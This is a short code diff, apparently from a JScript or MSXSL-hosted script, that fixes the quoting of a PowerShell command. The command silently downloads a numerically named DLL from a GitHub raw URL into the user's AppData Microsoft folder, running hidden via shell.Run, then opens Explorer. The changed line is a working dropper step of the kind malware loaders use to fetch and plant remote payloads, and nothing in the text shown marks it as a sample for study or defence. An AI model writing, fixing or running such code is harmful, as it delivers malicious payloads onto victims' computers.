@@ -18,7 +18,7 @@
 	            var url = "https://github.com/MohamedAbderraouf/hostingmsxsl/raw/refs/heads/main/7346832764233279.dll";
 	
 	            try {
-	                var ps = 'powershell -Command "Invoke-WebRequest ''https://github.com/MohamedAbderraouf/hostingmsxsl/raw/refs/heads/main/7346832764233279.dll'' -OutFile ''$env:APPDATA\\Microsoft\\7346832764233279.dll''"';
+			var ps = "powershell -Command \"Invoke-WebRequest 'https://github.com/MohamedAbderraouf/hostingmsxsl/raw/refs/heads/main/7346832764233279.dll' -OutFile '$env:APPDATA\\Microsoft\\7346832764233279.dll'\"";
 	                shell.Run(ps, 0, true);
 	                shell.Run('explorer.exe "C:\\"', 0, true); // <-- PAS D'ERREUR ICI
 	            } catch(e) {
